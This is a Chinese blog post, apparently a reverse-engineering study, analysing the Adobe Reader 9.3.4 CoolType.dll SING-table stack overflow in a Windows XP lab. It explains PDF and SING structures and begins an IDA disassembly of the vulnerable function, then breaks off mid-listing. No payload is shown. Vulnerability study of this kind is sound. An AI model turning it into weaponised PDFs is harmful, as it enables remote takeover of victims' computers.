<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Chieh">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    
    
        
            <link rel="preconnect" href="https://npm.elemecdn.com" crossorigin>
        
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2023/05/22/pdf病毒漏洞尝试/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="我的一个朋友系列小时候打游戏肝到一个武器装备(在当时很值钱嗷)，遇到一个人说要跟我聊聊，于是乎，我就在QQ跟人聊天，结果说要发几张图片给我看价格表(PDF格式)，我信了他的邪接收了。结果我上线游戏准备交易，MD鼠标自己动了，直接把东西送给了他，cao，真恶心嗷~ So，如果打开了陌生人给你发送的某个东西,甚至是个图片,一个pdf 都会让电脑不知不觉成为别人的肉鸡(就是别人想对你的电脑干嘛就干嘛啦~">
<meta property="og:type" content="article">
<meta property="og:title" content="当PDF来敲门">
<meta property="og:url" content="http://example.com/2023/05/22/PDF%E7%97%85%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%B0%9D%E8%AF%95/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="我的一个朋友系列小时候打游戏肝到一个武器装备(在当时很值钱嗷)，遇到一个人说要跟我聊聊，于是乎，我就在QQ跟人聊天，结果说要发几张图片给我看价格表(PDF格式)，我信了他的邪接收了。结果我上线游戏准备交易，MD鼠标自己动了，直接把东西送给了他，cao，真恶心嗷~ So，如果打开了陌生人给你发送的某个东西,甚至是个图片,一个pdf 都会让电脑不知不觉成为别人的肉鸡(就是别人想对你的电脑干嘛就干嘛啦~">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e71c003ed4fc389b504ec26a0f.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/32fa828ba61ea8d3a10a50ced20a304e241f58cb.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/6609c93d70cf3bc7f8d2ec269400baa1cc112a2d.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/c9fcc3cec3fdfc03e1b7c272913f8794a5c22628.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/314e251f95cad1c8c771dded3a3e6709c83d5135.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c336800fe025f4c510fd8f9a1fb.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343f388a7ebd613b07ecb8088b0.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/b2de9c82d158ccbf231c95f05cd8bc3eb0354153.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/8b82b9014a90f603d830bc8d7c12b31bb151ed7c.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/00e93901213fb80e5f23411d73d12f2eb838940d.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9b8d9e2ef61c8701a08bfb3d.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/6a600c338744ebf8ea5d47f59cf9d72a6159a7c8.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/63d0f703918fa0ecdc5e47c7639759ee3c6ddb5b.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffcbbc69c78fc014a90f703ea08.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/d009b3de9c82d15881557a7bc50a19d8bd3e4220.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16cfd1b8abb6deb48f8d5464e1.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/7c1ed21b0ef41bd5d455ca3e14da81cb38db3df1.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/d01373f082025aaf30455c01beedab64024f1a80.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/fc1f4134970a304e7f7a823094c8a786c8175c9b.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e712a338d4fc389b504ec26aa8.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/94cad1c8a786c91721047ff38c3d70cf3ac757f0.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/9d82d158ccbf6c81cd6e0122f93eb13532fa409a.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/279759ee3d6d55fb6a8c5bec28224f4a21a4ddb6.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/3b87e950352ac65c13bc4bb9bef2b21192138aba.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fc7e9bf81fafa40f4afb054c.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9fc5922ef61c8701a08bfb75.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/50da81cb39dbb6fd2f88c9ec4c24ab18962b372c.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/2cf5e0fe9925bc31609b2d521bdf8db1ca137031.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/c2cec3fdfc039245b8b3cec5c294a4c27c1e25f1.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16d2b1b5abb6deb48f8d546481.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb13090813d99854564e93584b92.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/54fbb2fb43166d2296323a5e032309f79152d2b7.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/f2deb48f8c5494eec5de20d368f5e0fe98257e7f.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/d833c895d143ad4b5cdc690ac7025aafa50f060d.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/622762d0f703918f6e9f1300143d269758eec4aa.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/80cb39dbb6fd5266ac6c12deee18972bd50736b0.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e9b8a80aa0ac2d56284356868.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/b3b7d0a20cf431add9396df30e36acaf2fdd9814.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/c2fdfc039245d688bae39c6ee1c27d1ed31b2412.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/2f738bd4b31c870112789c2c627f9e2f0608ff2a.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/4610b912c8fcc3ceaaf8e0f9d745d688d43f203b.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/dbb44aed2e738bd403059bfbe48b87d6267ff9d0.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/d50735fae6cd7b891d6813494a2442a7d8330ef7.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b506c8bc998c035e5dde6116e87.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343fa88aeebd613b07ecb8088b0.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/09fa513d269759eeefe94901f7fb43166c22dfbb.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/0df431adcbef760958c9b0556bdda3cc7dd99e3d.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/472309f790529822ae6a110992ca7bcb0b46d49b.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/0b55b319ebc4b745d9899cdc8afc1e178b8215de.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/48540923dd54564ed271cff3f6de9c82d0584fe7.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/4034970a304e251fc182cf32e286c9177e3e5386.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/738b4710b912c8fca5afdd07b9039245d788219f.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/1c950a7b02087bf4ca527c23b7d3572c10dfcfba.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c3361d7f5025f4c510fd8f9a14a.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/7a899e510fb30f24c604c7c98d95d143ac4b0359.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/fcfaaf51f3deb48fa3fb8a14b51f3a292cf5786d.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/d6ca7bcb0a46f21f5fc47599b3246b600d33ae0c.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/d62a6059252dd42ac7d72a61463b5bb5c8eab81a.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/d8f9d72a6059252d393237ce719b033b5ab5b9d7.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/6159252dd42a2834dbd41cc11eb5c9ea14cebf8e.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/2fdda3cc7cd98d10172926fb643fb80e7aec907e.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/21a4462309f7905241e96df449f3d7ca7acbd502.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fa129df81fafa40f4afb0518.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb1372a616d99854564e93584b28.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/faedab64034f78f066308f393c310a55b2191cc4.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffc853caa78fc014a90f703eae2.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b5050faf598c035e5dde6116ef6.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/2934349b033b5bb538ba353473d3d539b700bc8f.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/f7246b600c33874409eb39b6140fd9f9d62aa0ca.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/86d6277f9e2f070884b338caac24b899a801f242.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a2904b4c804dc25bc315d607cff.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/adaf2edda3cc7cd9815f29137c01213fb90e918d.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/1ad5ad6eddc451daea701121f3fd5266d1163271.jpg">
<meta property="og:image" content="http://imgsrc.baidu.com/forum/pic/item/9825bc315c6034a8716aa54b8e1349540823766b.jpg">
<meta property="article:published_time" content="2023-05-22T03:16:10.000Z">
<meta property="article:modified_time" content="2023-07-03T01:16:05.821Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="逆向">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e71c003ed4fc389b504ec26a0f.jpg">
    
    
        <!-- Google tag (gtag.js) -->
        <script async src="https://www.googletagmanager.com/gtag/js?id=G-F66GEHGYYZ"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-F66GEHGYYZ');
        </script>
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="https://img.sj33.cn/uploads/201908/7-1ZPR01548.jpg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="https://img.sj33.cn/uploads/201908/7-1ZPR01548.jpg">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="https://img.sj33.cn/uploads/201908/7-1ZPR01548.jpg">
    <!--- Page Info-->
    
    <title>
        
            当PDF来敲门 -
        
        Chieh
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="stylesheet" href="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/assets/fonts.css">
    <!--- Font Part-->
    
    
    
        <link href="" rel="stylesheet">
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    let Global = window.Global || {};
    Global.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":false},"author_label":{"enable":false,"auto":true,"list":["Lv1","Lv2","Lv3"]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":false,"lazyload":true,"recommendation":{"enable":false,"title":"猜你喜欢","limit":3,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"zh-CN","url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":false},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true,"google_analytics":{"enable":true,"id":"G-F66GEHGYYZ"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"https://baotangguo.cn:8081/","dark":"https://baotangguo.cn:8081/"},"title":"XuXu","subtitle":{"text":["我心里那一座天下","你坐镇笑靥如桃花","世间当真有两全法","江山深处抚你风华","云水边静沐暖阳","烟波里久违的故乡","别来无恙","你在心上"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":1000,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/LeonnS-Kennedy","instagram":null,"zhihu":"https://www.zhihu.com/people/bu-ru-liang-qing-38","twitter":null,"email":"LeonS.Kennedy__@outlook.com"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.1.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"GPT":{"icon":"fa-brands fa-airbnb","submenus":{"ChatGPT":"https://www.xuxu.live","BingAI":"https://www.chieh.live"}},"Friends":{"icon":"fa-solid fa-link","path":"/links/"}},"search":{"enable":true,"preload":true},"navbar":null},"page_templates":{"friends_column":3,"tags_style":"blur"},"home":{"sidebar":{"enable":false,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}}};
    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
  </script>
    
    <!--- Fontawesome Part-->
    <link rel="stylesheet" href="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/fontawesome/fontawesome.min.css">
    <link rel="stylesheet" href="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/fontawesome/brands.min.css">
    <link rel="stylesheet" href="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/fontawesome/solid.min.css">
    <link rel="stylesheet" href="//npm.elemecdn.com/hexo-theme-redefine@2.1.3/source/fontawesome/regular.min.css">
    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="pjax-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container">

    

    <div class="main-content-container">

        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Chieh
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        首页
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-brands fa-airbnb"></i>
                                        
                                        GPT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://www.xuxu.live">CHATGPT
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://www.chieh.live">BINGAI
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/links/"  >
                                    
                                        
                                            <i class="fa-solid fa-link"></i>
                                        
                                        友情链接
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer">
        <ul class="drawer-navbar-list">
            
                
                    <li class="drawer-navbar-item flex-center">
                        <a class="" 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                首页
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item flex-center">
                        <a class="has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-brands fa-airbnb"></i>
                                
                                GPT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="dropdown-item flex-center">
                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://www.xuxu.live">CHATGPT</a>
                            </li>
                        
                            <li class="dropdown-item flex-center">
                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://www.chieh.live">BINGAI</a>
                            </li>
                        
                    
            
                
                    <li class="drawer-navbar-item flex-center">
                        <a class="" 
                        href="/links/"  >
                             
                                
                                    <i class="fa-solid fa-link"></i>
                                
                                友情链接
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            
            
                <div class="article-title">
                    <h1 class="article-title-regular">当PDF来敲门</h1>
                </div>
            
                
            

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="https://img.sj33.cn/uploads/201908/7-1ZPR01600.jpg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">Chieh</span>
                            
                        </div>
                        <div class="meta-info">
                            <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2023-05-22 11:16:10</span>
        <span class="mobile">2023-05-22 11:16</span>
        <span class="hover-info">创建</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2023-07-03 09:16:05</span>
            <span class="mobile">2023-07-03 09:16</span>
            <span class="hover-info">更新</span>
        </span>
    

    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E9%80%86%E5%90%91/">逆向</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>10.1k 字</span>
        </span>
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content markdown-body">
                <h1 id="我的一个朋友系列"><a href="#我的一个朋友系列" class="headerlink" title="我的一个朋友系列"></a>我的一个朋友系列</h1><p>小时候打游戏肝到一个武器装备(在当时很值钱嗷)，遇到一个人说要跟我聊聊，于是乎，我就在QQ跟人聊天，结果说要发几张图片给我看价格表(PDF格式)，我信了他的邪接收了。结果我上线游戏准备交易，MD鼠标自己动了，直接把东西送给了他，cao，真恶心嗷~</p>
<p>So，如果打开了陌生人给你发送的某个东西,甚至是个图片,一个pdf 都会让电脑不知不觉成为别人的肉鸡(就是别人想对你的电脑干嘛就干嘛啦~)。</p>
<p>1.所需环境</p>
<ul>
<li>受害者所处操作系统：Windows XP </li>
<li>虚拟机：VMware workstation</li>
<li>动态调试：OllyDbg</li>
<li>静态调试：IDA pro</li>
<li>漏洞软件：Adobe Reader(版本号-9.3.4)</li>
</ul>
<h2 id="2-漏洞描述"><a href="#2-漏洞描述" class="headerlink" title="2.漏洞描述"></a>2.漏洞描述</h2><p>该漏洞是利用Adobe Reader 和 Acrobat中<code>CoolType.dll</code>库在解析字体文件<code>SING</code>表中存在的栈溢出漏洞，导致的结果就是当用户打开了特制的PDF文件后就可能导致任意代码执行</p>
<h2 id="3-基础知识"><a href="#3-基础知识" class="headerlink" title="3.基础知识"></a>3.基础知识</h2><p>本次漏洞是在PDF当中，因此需要线了解以下pdf文档，首先pdf的格式：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">|------------|</span><br><span class="line">|   header   |头部，用来注明版本号</span><br><span class="line">|------------|</span><br><span class="line">|    body    |主体，图片、文字等</span><br><span class="line">|------------|</span><br><span class="line">| xref table |交叉引用表，存放所有对象的偏移</span><br><span class="line">|------------|</span><br><span class="line">|  trailer   |文件尾部，以%%EOF结尾</span><br><span class="line">|------------|</span><br></pre></td></tr></table></figure></div>

<p>而ttf文件就是pdf中的字体文件，而TTF中关于SING表的数据结构体TableEntry的结构如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct_SING&#123;</span><br><span class="line">    <span class="type">char</span> tag[<span class="number">4</span>];        <span class="comment">//标记&quot;SING&quot;</span></span><br><span class="line">    ULONG checkSum;     <span class="comment">//校验和：0xD9BCC8B5</span></span><br><span class="line">    ULONG offset;       <span class="comment">//相对文件的偏移：0x0000011C</span></span><br><span class="line">    ULONG length;       <span class="comment">//数据长度：0x00001DDF</span></span><br><span class="line">&#125;TableEntry;</span><br></pre></td></tr></table></figure></div>

<p>上面是一个定位SING表的引子，接下来是SING表的整体结构:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e71c003ed4fc389b504ec26a0f.jpg"
                     
                ></p>
<p>具体数据结构如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FORMAT_SING_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FORMAT_SING_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SING_VERSION VERSION(1, 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SING_UNIQUENAMELEN 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SING_MD5LEN 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Card16 tableVersionMajor;   <span class="comment">//Card16,两字节</span></span><br><span class="line">Card16 tableVersionMinor;</span><br><span class="line">Card16 glyphletVersion;</span><br><span class="line">Card16 permissions;</span><br><span class="line">Card16 mainGID;</span><br><span class="line">Card16 unitsPerEm;</span><br><span class="line">Int16 vertAdvance;</span><br><span class="line">Int16 vertOrigin;</span><br><span class="line">Card8 uniqueName[SING_UNIQUENAMELEN];</span><br><span class="line">Card8 METAMD5[SING_MD5LEN];</span><br><span class="line">Card8 nameLength;</span><br><span class="line">Card8 *baseGlyphName; <span class="comment">/* name array */</span></span><br><span class="line">&#125; SINGTbl;</span><br></pre></td></tr></table></figure></div>

<h2 id="4-发现漏洞点"><a href="#4-发现漏洞点" class="headerlink" title="4.发现漏洞点"></a>4.发现漏洞点</h2><p>首先找到位于Adobe文件路径下的动态库</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/32fa828ba61ea8d3a10a50ced20a304e241f58cb.jpg"
                     
                ></p>
<p>打开IDA，分析<code>CoolType.dll</code>库，查看字符串表<code>SING</code>，然后查看交叉引用，这里若是使用F12找的字符串可能会出问题，因此使用ALT + T 组合键来寻找<code>SING</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>Language</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">text:0803DCF9                               ; __unwind &#123; // loc_8184A54</span><br><span class="line">.text:0803DCF9 55                            push    ebp</span><br><span class="line">.text:0803DCFA 81 EC 04 01 00 00             sub     esp, 104h                       ; esp开拓栈空间0x104</span><br><span class="line">.text:0803DD00 8D 6C 24 FC                   lea     ebp, [esp-4]</span><br><span class="line">.text:0803DD04 A1 B8 0F 23 08                mov     eax, ___security_cookie</span><br><span class="line">.text:0803DD09 33 C5                         xor     eax, ebp</span><br><span class="line">.text:0803DD0B 89 85 04 01 00 00             mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DD11 6A 4C                         push    4Ch</span><br><span class="line">.text:0803DD13 B8 54 4A 18 08                mov     eax, offset loc_8184A54</span><br><span class="line">.text:0803DD18 E8 B4 A4 00 00                call    __EH_prolog3_catch</span><br><span class="line">.text:0803DD18</span><br><span 